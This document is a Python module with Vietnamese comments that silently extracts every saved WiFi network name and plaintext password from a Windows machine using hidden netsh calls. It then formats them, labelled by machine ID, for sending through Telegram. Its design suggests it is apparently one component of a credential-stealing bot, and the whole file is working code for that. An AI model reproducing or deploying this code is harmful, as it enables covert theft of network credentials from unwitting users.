"""
Module lấy mật khẩu WiFi đã lưu trên Windows
"""
import subprocess
import re
import os


class WiFiExtractor:
    def __init__(self):
        self.wifi_profiles = []
    
    def get_wifi_passwords(self):
        """
        Lấy tất cả mật khẩu WiFi đã lưu
        
        Returns:
            list: Danh sách WiFi với mật khẩu
        """
        try:
            # Lấy danh sách profile WiFi
            result = subprocess.run(
                ['netsh', 'wlan', 'show', 'profiles'],
                capture_output=True,
                text=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            # Tìm tất cả profile
            profiles = re.findall(r'All User Profile\s*:\s*(.+)', result.stdout)
            
            wifi_list = []
            
            for profile in profiles:
                profile = profile.strip()
                if not profile:
                    continue
                
                # Lấy mật khẩu của profile
                key_result = subprocess.run(
                    ['netsh', 'wlan', 'show', 'profile', f'name="{profile}"', 'key=clear'],
                    capture_output=True,
                    text=True,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                
                # Tìm mật khẩu
                key_match = re.search(r'Key Content\s*:\s*(.+)', key_result.stdout)
                password = key_match.group(1).strip() if key_match else "N/A"
                
                # Tìm thông tin bảo mật
                auth_match = re.search(r'Authentication\s*:\s*(.+)', key_result.stdout)
                auth = auth_match.group(1).strip() if auth_match else "N/A"
                
                wifi_list.append({
                    'ssid': profile,
                    'password': password,
                    'authentication': auth
                })
            
            return wifi_list
        
        except Exception as e:
            return []
    
    def format_wifi_list(self, wifi_list, machine_id=None):
        """
        Format danh sách WiFi để gửi qua Telegram
        
        Args:
            wifi_list: Danh sách WiFi
            machine_id: Machine ID
            
        Returns:
            str: Text đã format
        """
        if not wifi_list:
            return "📶 Không tìm thấy WiFi nào đã lưu"
        
        machine_header = f"🖥️ Machine: {machine_id}\n\n" if machine_id else ""
        text = f"{machine_header}📶 DANH SÁCH WIFI ĐÃ LƯU\n\n"
        
        for i, wifi in enumerate(wifi_list, 1):
            text += f"🔹 {i}. {wifi['ssid']}\n"
            text += f"   🔑 Mật khẩu: {wifi['password']}\n"
            text += f"   🔒 Bảo mật: {wifi['authentication']}\n\n"
        
        return text

